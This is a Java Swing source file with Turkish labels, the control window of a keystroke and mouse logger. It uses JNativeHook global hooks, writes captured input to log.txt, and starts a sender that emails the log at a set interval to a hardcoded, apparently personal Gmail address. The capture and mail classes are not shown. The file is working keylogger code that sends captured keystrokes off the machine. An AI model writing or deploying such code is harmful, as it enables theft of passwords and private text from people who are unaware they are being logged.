
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.dispatcher.SwingDispatchService;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Ana_Ekran extends javax.swing.JFrame {

    private static final String DOSYA_ADI = "log.txt";
    private KeyboardLogger keyboardLogger;
    private MouseLogger mouseLogger;
    private BufferedWriter writer;
    private dosyayaz d_temizle;
    public static Long max_file;


    public Ana_Ekran() throws IOException {
        
            initComponents();
            GlobalScreen.setEventDispatcher(new SwingDispatchService());
            keyboardLogger = new KeyboardLogger();
            writer = new BufferedWriter(new FileWriter(DOSYA_ADI, true));
            mouseLogger = new MouseLogger();
            d_temizle = new dosyayaz();
       
    }

    /**
      Bu methodu formu başlatmak için constructor içinde çağırıyoruz.
     Methodun içindeki kodlar Form Editor tarafından oluşturuldu.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jLabel1 = new javax.swing.JLabel();
        jLabel2 = new javax.swing.JLabel();
        jLabel3 = new javax.swing.JLabel();
        jTextField1 = new javax.swing.JTextField();
        jTextField2 = new javax.swing.JTextField();
        jTextField3 = new javax.swing.JTextField();
        jButton1 = new javax.swing.JButton();
        jButton2 = new javax.swing.JButton();
        jCheckBox1 = new javax.swing.JCheckBox();
        jCheckBox2 = new javax.swing.JCheckBox();
        jCheckBox3 = new javax.swing.JCheckBox();
        jLabel4 = new javax.swing.JLabel();
        jLabel5 = new javax.swing.JLabel();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        jLabel1.setText("Mail Gönderme Aralıkları dk:");

        jLabel2.setText("Gönderilecek Mail Hersabı:");

        jLabel3.setText("Max Log file Boyutu MB: ");

        jTextField1.setText("5");
        jTextField1.setToolTipText("");

        jTextField2.setText("xxxxxx@xxxxx.com");
        jTextField2.setToolTipText("");

        jTextField3.setText("1");

        jButton1.setText("Durdur");
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });

        jButton2.setText("Başlat");
        jButton2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton2ActionPerformed(evt);
            }
        });

        jCheckBox1.setText("Sadece Fare");
        jCheckBox1.addItemListener(new java.awt.event.ItemListener() {
            public void itemStateChanged(java.awt.event.ItemEvent evt) {
                jCheckBox1İtemStateChanged(evt);
            }
        });

        jCheckBox2.setText("Sadece Klavye");
        jCheckBox2.addItemListener(new java.awt.event.ItemListener() {
            public void itemStateChanged(java.awt.event.ItemEvent evt) {
                jCheckBox2İtemStateChanged(evt);
            }
        });

        jCheckBox3.setText("Her İkisi");
        jCheckBox3.addItemListener(new java.awt.event.ItemListener() {
            public void itemStateChanged(java.awt.event.ItemEvent evt) {
                jCheckBox3İtemStateChanged(evt);
            }
        });

        jLabel5.setToolTipText("");

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jLabel2)
                    .addComponent(jLabel3)
                    .addComponent(jLabel1))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jTextField2, javax.swing.GroupLayout.PREFERRED_SIZE, 189, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jTextField3, javax.swing.GroupLayout.PREFERRED_SIZE, 35, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jTextField1, javax.swing.GroupLayout.PREFERRED_SIZE, 35, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 69, Short.MAX_VALUE)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jCheckBox3)
                    .addComponent(jCheckBox2)
                    .addComponent(jCheckBox1))
                .addGap(27, 27, 27))
            .addGroup(layout.createSequentialGroup()
                .addGap(55, 55, 55)
                .addComponent(jButton1)
                .addGap(18, 18, 18)
                .addComponent(jButton2)
                .addGap(64, 64, 64)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jLabel5)
                    .addComponent(jLabel4))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGap(24, 24, 24)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel1)
                    .addComponent(jTextField1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jCheckBox1))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel2)
                    .addComponent(jTextField2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jCheckBox2))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel3)
                    .addComponent(jTextField3, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jCheckBox3)
                    .addComponent(jLabel5))
                .addGap(18, 18, 18)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jButton1)
                    .addComponent(jButton2)
                    .addComponent(jLabel4))
                .addContainerGap(16, Short.MAX_VALUE))
        );

        jTextField3.getAccessibleContext().setAccessibleName("");

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void jButton2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton2ActionPerformed
        long limit_boyut = Long.parseLong(jTextField3.getText());
        max_file= 1024 * limit_boyut;
        System.out.println(max_file.toString());
        
        if (jCheckBox1.isSelected() && !jCheckBox2.isSelected() && !jCheckBox3.isSelected()) {
            jLabel4.setText("Sadece Fare Dinleme Başlatıldı.");
            mouseLogger.startListening();

        }
        if (!jCheckBox1.isSelected() && jCheckBox2.isSelected() && !jCheckBox3.isSelected()) {
            jLabel4.setText("Sadece Klavye Dinleme Başlatıldı.");
            keyboardLogger.startListening();

        }
        if (!jCheckBox1.isSelected() && !jCheckBox2.isSelected() && jCheckBox3.isSelected()) {
            jLabel4.setText("Sadece Fare ve Klavye Dinleme Başlatıldı.");
            mouseLogger.startListening();
            keyboardLogger.startListening();
        }
        String dosyaYolu = "log.txt";
        String mailAdresi = "abdullahkaratas2002@gmail.com";
        long periyot = Long.parseLong(jTextField1.getText()) * 60 * 1000; // 5 dakika (milisaniye cinsinden)

        DosyaGonder gonderici = new DosyaGonder(dosyaYolu, mailAdresi, periyot);
        gonderici.baslat();
        //
    }

    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed
        try {
            mouseLogger.stopListening();
            // keyboardLogger.stopListening();
           jLabel4.setText("Tüm Dinlemeler Durduruldu.");
            
        } catch (NativeHookException ex) {
            Logger.getLogger(Ana_Ekran.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    private void jCheckBox1İtemStateChanged(java.awt.event.ItemEvent evt) {//GEN-FIRST:event_jCheckBox1İtemStateChanged
        if (jCheckBox1.isSelected()) {
            jCheckBox2.setSelected(false);
            jCheckBox3.setSelected(false);

        }


    }

    private void jCheckBox2İtemStateChanged(java.awt.event.ItemEvent evt) {//GEN-FIRST:event_jCheckBox2İtemStateChanged
        if (jCheckBox2.isSelected()) {
            jCheckBox1.setSelected(false);
            jCheckBox3.setSelected(false);

        }

    }

    private void jCheckBox3İtemStateChanged(java.awt.event.ItemEvent evt) {//GEN-FIRST:event_jCheckBox3İtemStateChanged
        if (jCheckBox3.isSelected()) {
            jCheckBox2.setSelected(false);
            jCheckBox1.setSelected(false);

        }

    }


    //Kodu çalıştıran main methodum.
    public static void main(String args[]) {
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException | InstantiationException | IllegalAccessException | javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(Ana_Ekran.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }

        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                try {
                    new Ana_Ekran().setVisible(true);
                } catch (IOException ex) {
                    Logger.getLogger(Ana_Ekran.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        });
    }

    // Arayüz için kullandığımız değişkenler.
    private javax.swing.JButton jButton1;
    private javax.swing.JButton jButton2;
    private javax.swing.JCheckBox jCheckBox1;
    private javax.swing.JCheckBox jCheckBox2;
    private javax.swing.JCheckBox jCheckBox3;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel4;
    public static javax.swing.JLabel jLabel5;
    private javax.swing.JTextField jTextField1;
    private javax.swing.JTextField jTextField2;
    public javax.swing.JTextField jTextField3;

}
